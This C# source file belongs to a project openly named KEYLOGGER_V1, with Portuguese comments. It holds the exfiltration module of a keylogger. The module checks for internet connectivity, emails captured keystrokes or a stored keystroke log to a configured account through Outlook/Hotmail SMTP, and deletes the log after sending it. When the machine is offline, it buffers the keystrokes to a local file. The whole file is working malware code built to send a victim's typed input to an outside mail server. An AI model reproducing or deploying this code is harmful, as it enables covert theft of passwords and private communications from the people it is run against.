using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;


namespace KEYLOGGER_V1
{
    public class c_Enviar_Email
    {
        public c_Enviar_Email()                           //METODO CONSTRUTOR: Sem parametros.
        {

        }
        public c_Enviar_Email(String Email, String Senha) //METODO CONSTRUTOR: Com parametros.
        {
            _Email = Email;
            _Senha = Senha;
        }

       
        string _Email = "";   // NAO ESQUEÇA DE APAGAR AO COMITAR NO GITHUB ;) CONSELHO!!
        string _Senha = "";

        [DllImport("wininet.dll")]
        //Utilizado para a Confirmação da conexão. 

        private extern static Boolean InternetGetConnectedState(out int Description, int ReservedValue); //Utilizado para a Confirmação da conexão.
     
        public void SalvaLogOuEnviaEmail(String Texto, String dirLog)        //METODO: Verifica a conexão. se estiver conectado a internet ele envia por EMAIL.
        {

            if (Verifica_Conexao_Web())
            {
                if (Texto != "")
                {
                    Enviar_Email(Texto); //Envia email.
    
                }
                else
                {
                    if (Verifica_Existencia_Log(dirLog))
                    {
                        Enviar_Email_Log(dirLog);
                        File.Delete(dirLog);
                    }
                }


            }
            else
            {
                if (Texto != "")
                {
                    criarLog(dirLog,Texto); //Cria Backup.
                }
            }
        }   
        void criarLog(String Dirlog, String Texto)                           //METODO: Cria o log das teclas digitadas.
        {

            if (File.Exists(Dirlog))
            {
                if (Texto != "")
                {
                    StreamWriter SW = new StreamWriter(Dirlog, true);
                    SW.Write(Texto);
                    SW.Close();
                }

            }
            //  txtTextoDigitado.Clear();
        }
        public bool Verifica_Conexao_Web()                                   //METODO: Verifica que se a conexão, e retorna [TRUE]. 
        {
            bool result;

            try
            {

                int Description;

                result = InternetGetConnectedState(out Description, 0);

            }

            catch
            {

                result = false;

            }

            return result;
        }
        public void Enviar_Email(String Texto)                               //METODO: Email com as teclas digitadas. 
        {

            MailMessage email;
            Stopwatch Stop = new Stopwatch();
            email = new MailMessage();
            email.To.Add(new MailAddress(_Email));
            email.From = (new MailAddress(_Email));
            email.Subject = "KeyLLogger";
            email.IsBodyHtml = true;
            email.Body = Texto;
            SmtpClient cliente = new SmtpClient("smtp.live.com", 587); // TEM QUE SER HOTMAIL ou OUTLOOK
            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential(_Email, _Senha);

                cliente.EnableSsl = true;
                cliente.Send(email);
            }


        }
        public void Enviar_Email_Log(String DirLog)                          //METODO: Envia email com o log como anexo. 
        {
            MailMessage email;
            Stopwatch Stop = new Stopwatch();
            email = new MailMessage();
            email.To.Add(new MailAddress(_Email));
            email.From = (new MailAddress(_Email));
            email.Subject = "KeyLLogger";
            email.IsBodyHtml = true;
            email.Attachments.Add(new Attachment(DirLog));

            SmtpClient cliente = new SmtpClient("smtp.live.com", 587); // TEM QUE SER HOTMAIL ou OUTLOOK
            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential(_Email, _Senha);
                cliente.EnableSsl = true;
                cliente.Send(email);
            }

        }
        public bool Verifica_Existencia_Log(String dirLog)                   //METODO: Verifica se diretorio do LOG existe.
        {

            if (File.Exists(dirLog))
            {
                return true;
            }
            else
            {
                if (File.Exists(dirLog.Substring(0, 7))!= true)
                {
                    string teste = dirLog.Substring(0, 7);
                    Directory.CreateDirectory(teste);
                    return false;
                }
                return false;
            }

        }    
    }
}
